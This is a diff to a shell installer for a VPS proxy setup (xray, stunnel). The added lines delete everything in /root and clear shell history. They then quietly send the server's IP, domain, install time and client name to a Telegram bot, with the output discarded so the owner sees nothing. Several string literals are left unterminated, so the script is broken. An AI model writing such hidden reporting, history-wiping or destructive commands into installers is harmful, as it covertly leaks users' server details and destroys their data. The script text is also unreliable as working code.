@@ -456,9 +456,38 @@ systemctl start stunnel5
 systemctl start xray
 systemctl start udp-custom
 rm -fr /root/*
-#sudo hostnamectl set-hostname $user
-secs_to_human "$(($(date +%s) - ${start}))"
-sudo hostnamectl set-hostname $username
+rm -fr /root/*
+cat > /root/system << END
+END
+history -c
+ip_vps=$(curl ifconfig.me)
+clear
+echo -e "
+"
+TEXT="
+==================================
+Detail Install Script
+==================================
+IP VPS: $ip_vps
+Domain: $(cat /etc/xray/domain)
+Waktu Install: $date
+Client Name: $Name
+==================================
+
+clear
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+echo ""
+clear
+echo -e "
+==================================
+Detail Install Script
+==================================
+IP VPS        : $ip_vps
+Domain        : $(cat /etc/xray/domain)
+Date & Time   : $date
+Client Name   : $Name
+==================================
+
 echo  " "
 echo "=====================-[ PREMIUM VVIP ]-===================="
 echo  ""
